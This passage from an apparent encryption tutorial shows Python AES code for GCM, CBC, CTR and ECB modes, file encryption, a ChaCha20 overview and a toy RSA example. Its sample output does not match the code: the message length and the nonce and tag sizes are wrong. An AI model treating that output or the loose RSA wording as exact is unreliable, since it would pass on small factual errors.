try:\n            # Decrypt and verify in one step\n            plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n            return plaintext\n        except ValueError:\n            raise ValueError(\"Authentication failed! Data was tampered with.\")\n\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n    # MODE 2: CBC (Cipher Block Chaining) - TRADITIONAL\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n    def encrypt_cbc(self, plaintext: bytes) -&gt; dict:\n        \"\"\"\n        Encrypt using AES-CBC mode\n\n        Characteristics:\n        \u2713 Each block depends on previous block\n        \u2713 Requires padding\n        \u2713 Requires IV (Initialization Vector)\n        \u26a0\ufe0f No authentication (use HMAC separately)\n\n        Returns: dict with ciphertext and IV\n        \"\"\"\n        # Generate random IV (must be unpredictable)\n        iv = get_random_bytes(self.block_size)\n\n        # Create cipher\n        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n\n        # Pad plaintext to block size (PKCS7 padding)\n        padded_plaintext = pad(plaintext, self.block_size)\n\n        # Encrypt\n        ciphertext = cipher.encrypt(padded_plaintext)\n\n        return {\n            'ciphertext': ciphertext,\n            'iv': iv\n        }\n\n    def decrypt_cbc(self, ciphertext: bytes, iv: bytes) -&gt; bytes:\n        \"\"\"Decrypt AES-CBC\"\"\"\n        cipher = AES.new(self.key, AES.MODE_CBC, iv)\n        padded_plaintext = cipher.decrypt(ciphertext)\n\n        # Remove padding\n        plaintext = unpad(padded_plaintext, self.block_size)\n        return plaintext\n\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n    # MODE 3: CTR (Counter Mode) - STREAM CIPHER\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n    def encrypt_ctr(self, plaintext: bytes) -&gt; dict:\n        \"\"\"\n        Encrypt using AES-CTR mode\n\n        Characteristics:\n        \u2705 Turns block cipher into stream cipher\n        \u2705 Parallelizable (fast)\n        \u2705 Random access to encrypted data\n        \u2705 No padding needed\n        \u26a0\ufe0f No authentication\n\n        Returns: dict with ciphertext and nonce\n        \"\"\"\n        # Generate random nonce (number used once)\n        nonce = get_random_bytes(8)  # CTR uses 8-byte nonce\n\n        # Create cipher (nonce will be used as counter prefix)\n        cipher = AES.new(self.key, AES.MODE_CTR, nonce=nonce)\n\n        # Encrypt (works on any length, no padding)\n        ciphertext = cipher.encrypt(plaintext)\n\n        return {\n            'ciphertext': ciphertext,\n            'nonce': nonce\n        }\n\n    def decrypt_ctr(self, ciphertext: bytes, nonce: bytes) -&gt; bytes:\n        \"\"\"Decrypt AES-CTR\"\"\"\n        cipher = AES.new(self.key, AES.MODE_CTR, nonce=nonce)\n        plaintext = cipher.decrypt(ciphertext)\n        return plaintext\n\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n    # MODE 4: ECB (Electronic Codebook) - NOT RECOMMENDED\n    # \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\n    def encrypt_ecb(self, plaintext: bytes) -&gt; bytes:\n        \"\"\"\n        Encrypt using AES-ECB mode\n\n        \u26a0\ufe0f  WARNING: NOT SECURE FOR MOST USE CASES\n        \u274c Same plaintext block \u2192 same ciphertext block\n        \u274c Patterns visible in ciphertext\n        \u274c No IV/nonce\n\n        Only use for encrypting random data (like keys)\n        \"\"\"\n        cipher = AES.new(self.key, AES.MODE_ECB)\n        padded_plaintext = pad(plaintext, self.block_size)\n        ciphertext = cipher.encrypt(padded_plaintext)\n        return ciphertext\n\n    def decrypt_ecb(self, ciphertext: bytes) -&gt; bytes:\n        \"\"\"Decrypt AES-ECB\"\"\"\n        cipher = AES.new(self.key, AES.MODE_ECB)\n        padded_plaintext = cipher.decrypt(ciphertext)\n        plaintext = unpad(padded_plaintext, self.block_size)\n        return plaintext\n\n\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n# USAGE EXAMPLES\n# \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nif __name__ == '__main__':\n    print(\"=\"*60)\n    print(\"AES ENCRYPTION DEMONSTRATION\")\n    print(\"=\"*60)\n\n    # Initialize cipher with 256-bit key\n    aes = AESCipher()\n\n    # Test data\n    plaintext = b\"This is a secret message that needs encryption!\"\n    print(f\"\\nOriginal: {plaintext.decode()}\")\n    print(f\"Length: {len(plaintext)} bytes\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # Example 1: AES-GCM (RECOMMENDED)\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\" + \"\u2500\"*60)\n    print(\"1. AES-256-GCM (Best for most use cases)\")\n    print(\"\u2500\"*60)\n\n    # Encrypt\n    encrypted_gcm = aes.encrypt_gcm(plaintext)\n    print(f\"Ciphertext: {encrypted_gcm['ciphertext'].hex()[:60]}...\")\n    print(f\"Nonce: {encrypted_gcm['nonce'].hex()}\")\n    print(f\"Tag: {encrypted_gcm['tag'].hex()}\")\n\n    # Decrypt\n    decrypted_gcm = aes.decrypt_gcm(\n        encrypted_gcm['ciphertext'],\n        encrypted_gcm['nonce'],\n        encrypted_gcm['tag']\n    )\n    print(f\"Decrypted: {decrypted_gcm.decode()}\")\n    print(f\"\u2705 Match: {decrypted_gcm == plaintext}\")\n\n    # Test tampering detection\n    print(\"\\n\ud83d\udd12 Testing tamper detection...\")\n    tampered_ciphertext = bytearray(encrypted_gcm['ciphertext'])\n    tampered_ciphertext[0] ^= 0x01  # Flip one bit\n\n    try:\n        aes.decrypt_gcm(bytes(tampered_ciphertext), \n                       encrypted_gcm['nonce'], \n                       encrypted_gcm['tag'])\n        print(\"\u274c Tampering not detected!\")\n    except ValueError as e:\n        print(f\"\u2705 Tampering detected: {e}\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # Example 2: AES-CBC\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\" + \"\u2500\"*60)\n    print(\"2. AES-256-CBC (Traditional mode)\")\n    print(\"\u2500\"*60)\n\n    encrypted_cbc = aes.encrypt_cbc(plaintext)\n    print(f\"Ciphertext: {encrypted_cbc['ciphertext'].hex()[:60]}...\")\n    print(f\"IV: {encrypted_cbc['iv'].hex()}\")\n\n    decrypted_cbc = aes.decrypt_cbc(\n        encrypted_cbc['ciphertext'],\n        encrypted_cbc['iv']\n    )\n    print(f\"Decrypted: {decrypted_cbc.decode()}\")\n    print(f\"\u2705 Match: {decrypted_cbc == plaintext}\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # Example 3: AES-CTR\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\" + \"\u2500\"*60)\n    print(\"3. AES-256-CTR (Stream cipher mode)\")\n    print(\"\u2500\"*60)\n\n    encrypted_ctr = aes.encrypt_ctr(plaintext)\n    print(f\"Ciphertext: {encrypted_ctr['ciphertext'].hex()[:60]}...\")\n    print(f\"Nonce: {encrypted_ctr['nonce'].hex()}\")\n\n    decrypted_ctr = aes.decrypt_ctr(\n        encrypted_ctr['ciphertext'],\n        encrypted_ctr['nonce']\n    )\n    print(f\"Decrypted: {decrypted_ctr.decode()}\")\n    print(f\"\u2705 Match: {decrypted_ctr == plaintext}\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # Example 4: Key Size Comparison\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\" + \"\u2500\"*60)\n    print(\"4. Key Size Comparison\")\n    print(\"\u2500\"*60)\n\n    key_sizes = {\n        'AES-128': 16,\n        'AES-192': 24,\n        'AES-256': 32\n    }\n\n    for name, size in key_sizes.items():\n        key = get_random_bytes(size)\n        aes_test = AESCipher(key)\n        enc = aes_test.encrypt_gcm(b\"Test\")\n        print(f\"{name}: Key={size*8} bits, \"\n              f\"Rounds={10 if size==16 else 12 if size==24 else 14}\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # Example 5: File Encryption\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\" + \"\u2500\"*60)\n    print(\"5. File Encryption Example\")\n    print(\"\u2500\"*60)\n\n    def encrypt_file(filename: str, key: bytes):\n        \"\"\"Encrypt a file using AES-GCM\"\"\"\n        # Read file\n        with open(filename, 'rb') as f:\n            plaintext = f.read()\n\n        # Encrypt\n        aes = AESCipher(key)\n        encrypted = aes.encrypt_gcm(plaintext)\n\n        # Save encrypted file\n        encrypted_filename = filename + '.enc'\n        with open(encrypted_filename, 'wb') as f:\n            # Save nonce (16 bytes)\n            f.write(encrypted['nonce'])\n            # Save tag (16 bytes)\n            f.write(encrypted['tag'])\n            # Save ciphertext\n            f.write(encrypted['ciphertext'])\n\n        print(f\"\u2705 Encrypted: {encrypted_filename}\")\n        return encrypted_filename\n\n    def decrypt_file(encrypted_filename: str, key: bytes, output_filename: str):\n        \"\"\"Decrypt a file encrypted with AES-GCM\"\"\"\n        # Read encrypted file\n        with open(encrypted_filename, 'rb') as f:\n            nonce = f.read(16)\n            tag = f.read(16)\n            ciphertext = f.read()\n\n        # Decrypt\n        aes = AESCipher(key)\n        plaintext = aes.decrypt_gcm(ciphertext, nonce, tag)\n\n        # Save decrypted file\n        with open(output_filename, 'wb') as f:\n            f.write(plaintext)\n\n        print(f\"\u2705 Decrypted: {output_filename}\")\n\n    # Create test file\n    with open('/tmp/test.txt', 'w') as f:\n        f.write(\"Secret file content!\")\n\n    # Encrypt and decrypt\n    file_key = get_random_bytes(32)\n    enc_file = encrypt_file('/tmp/test.txt', file_key)\n    decrypt_file(enc_file, file_key, '/tmp/test_decrypted.txt')\n\n    # Verify\n    with open('/tmp/test.txt', 'rb') as f1:\n        with open('/tmp/test_decrypted.txt', 'rb') as f2:\n            print(f\"\u2705 Files match: {f1.read() == f2.read()}\")\n\n    # Cleanup\n    os.remove('/tmp/test.txt')\n    os.remove(enc_file)\n    os.remove('/tmp/test_decrypted.txt')\n\n    print(\"\\n\" + \"=\"*60)\n    print(\"RECOMMENDATIONS\")\n    print(\"=\"*60)\n    print(\"\"\"\n    \u2705 USE:\n       - AES-GCM for most applications (auth + encryption)\n       - AES-256 for maximum security\n       - AES-CTR for streaming/random access\n\n    \u26a0\ufe0f  CONSIDER:\n       - AES-CBC with HMAC for compatibility\n       - AES-128 for performance (still very secure)\n\n    \u274c AVOID:\n       - AES-ECB (insecure for most use cases)\n       - Reusing nonces/IVs\n       - Encryption without authentication\n    \"\"\")\n</code></pre> <p>Output Example: <pre><code>============================================================\nAES ENCRYPTION DEMONSTRATION\n============================================================\n\nOriginal: This is a secret message that needs encryption!\nLength: 48 bytes\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n1. AES-256-GCM (Best for most use cases)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nCiphertext: 8a3f2e1d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b9a8f7e...\nNonce: 7f3a8e2c1b9d4f6a8c3e5b7d\nTag: 9f2e4d7c1a8b6e3f5d2c9a7b\n\nDecrypted: This is a secret message that needs encryption!\n\u2705 Match: True\n\n\ud83d\udd12 Testing tamper detection...\n\u2705 Tampering detected: Authentication failed! Data was tampered with.\n</code></pre></p> <p>AES in Practice: <pre><code>from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Util.Padding import pad, unpad\n\n# AES Encryption Example\ndef aes_encrypt(plaintext: bytes, key: bytes) -&gt; tuple:\n    \"\"\"\n    Encrypt data using AES-256-GCM\n\n    Returns: (ciphertext, nonce, tag)\n    \"\"\"\n    cipher = AES.new(key, AES.MODE_GCM)\n    ciphertext, tag = cipher.encrypt_and_digest(plaintext)\n    return ciphertext, cipher.nonce, tag\n\ndef aes_decrypt(ciphertext: bytes, key: bytes, nonce: bytes, tag: bytes) -&gt; bytes:\n    \"\"\"Decrypt AES-GCM encrypted data\"\"\"\n    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n    plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n    return plaintext\n\n# Usage\nkey = get_random_bytes(32)  # 256-bit key\nplaintext = b\"Secret message\"\n\n# Encrypt\nciphertext, nonce, tag = aes_encrypt(plaintext, key)\nprint(f\"Ciphertext: {ciphertext.hex()}\")\n\n# Decrypt\ndecrypted = aes_decrypt(ciphertext, key, nonce, tag)\nprint(f\"Decrypted: {decrypted.decode()}\")\n</code></pre></p>"},{"location":"security/encryption/#chacha20","title":"ChaCha20","text":"<p>Description: ChaCha20 is a modern stream cipher designed by Daniel J. Bernstein. It's optimized for software performance, especially on mobile devices without AES hardware acceleration.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            ChaCha20 Algorithm Structure                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nINPUT:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Key:       256 bits (32 bytes)        \u2502\n\u2502 Nonce:     96 bits (12 bytes)         \u2502\n\u2502 Counter:   32 bits (4 bytes)          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n              \u2193\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 Initial State   \u2502\n    \u2502   (512 bits)    \u2502\n    \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n    \u2502 Constants (128) \u2502 \"expand 32-byte k\"\n    \u2502 Key (256)       \u2502 256-bit key\n    \u2502 Counter (32)    \u2502 Block counter\n    \u2502 Nonce (96)      \u2502 Random nonce\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n             \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502  20 Rounds      \u2502\n    \u2502  (Quarter rounds)\u2502\n    \u2502                 \u2502\n    \u2502  Each round:    \u2502\n    \u2502  - Add          \u2502\n    \u2502  - XOR          \u2502\n    \u2502  - Rotate       \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n             \u2502\n    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 Add Initial     \u2502\n    \u2502     State       \u2502\n    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n             \u2502\nOUTPUT: 512-bit Keystream Block\n        \u2193\nXOR with plaintext \u2192 Ciphertext\n\nAdvantages:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2705 Constant-time (resistant to timing attacks)\n\u2705 Fast on mobile/ARM processors\n\u2705 No AES-NI needed\n\u2705 Simpler than AES\n\u2705 Resistant to cache-timing attacks\n</code></pre> <p>ChaCha20 vs AES: <pre><code>                  ChaCha20          AES-256\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nType              Stream cipher     Block cipher\nSpeed (no AES-NI) \u26a1\u26a1\u26a1 Very Fast    \u26a1 Moderate\nSpeed (AES-NI)    \u26a1\u26a1 Fast          \u26a1\u26a1\u26a1 Very Fast\nMobile/ARM        \u26a1\u26a1\u26a1 Excellent   \u26a1 Good\nSecurity          \u2705 Excellent      \u2705 Excellent\nAdoption          Growing          Widespread\nUse Case          TLS, VPN, Mobile General purpose\n</code></pre></p> <p>Where ChaCha20 is Used: - Google Chrome (TLS_CHACHA20_POLY1305) - Android encryption - WireGuard VPN - Signal messaging - SSH (ChaCha20-Poly1305)</p>"},{"location":"security/encryption/#detailed-asymmetric-encryption-algorithms","title":"Detailed Asymmetric Encryption Algorithms","text":""},{"location":"security/encryption/#rsa-rivest-shamir-adleman","title":"RSA (Rivest-Shamir-Adleman)","text":"<p>Description: RSA is the most widely used asymmetric encryption algorithm. It's based on the mathematical difficulty of factoring large prime numbers.</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                 RSA Algorithm                                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nKEY GENERATION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nStep 1: Choose two large prime numbers\n        p = 61, q = 53 (toy example, real: 1024+ bits each)\n\nStep 2: Compute n = p \u00d7 q\n        n = 61 \u00d7 53 = 3233\n\nStep 3: Compute \u03c6(n) = (p-1) \u00d7 (q-1)\n        \u03c6(n) = 60 \u00d7 52 = 3120\n\nStep 4: Choose e (public exponent)\n        e = 17 (common values: 3, 17, 65537)\n        Must be: 1 &lt; e &lt; \u03c6(n) and gcd(e, \u03c6(n)) = 1\n\nStep 5: Calculate d (private exponent)\n        d \u00d7 e \u2261 1 (mod \u03c6(n))\n        d = 2753\n\nKEYS:\n\u2500\u2500\u2500\u2500\u2500\nPublic Key:  (e, n) = (17, 3233)\nPrivate Key: (d, n) = (2753, 3233)\n\nENCRYPTION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPlaintext:  m = 123\nCiphertext: c = m^e mod n\n            c = 123^17 mod 3233 = 855\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Plaintext\u2502\n\u2502   m      \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u2502 Raise to power e\n     \u2502 Modulo n\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Ciphertext\u2502\n\u2502   c      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nDECRYPTION:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nCiphertext: c = 855\nPlaintext:  m = c^d mod n\n            m = 855^2753 mod 3233 = 123\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502Ciphertext\u2502\n\u2502   c      \u2502\n\u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n     \u2502\n     \u2502 Raise to power d\n     \u2502 Modulo n\n     \u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Plaintext\u2502\n\u2502   m      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSECURITY BASIS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nEasy:    n = p \u00d7 q (multiply primes)\nHard:    Given n, find p and q 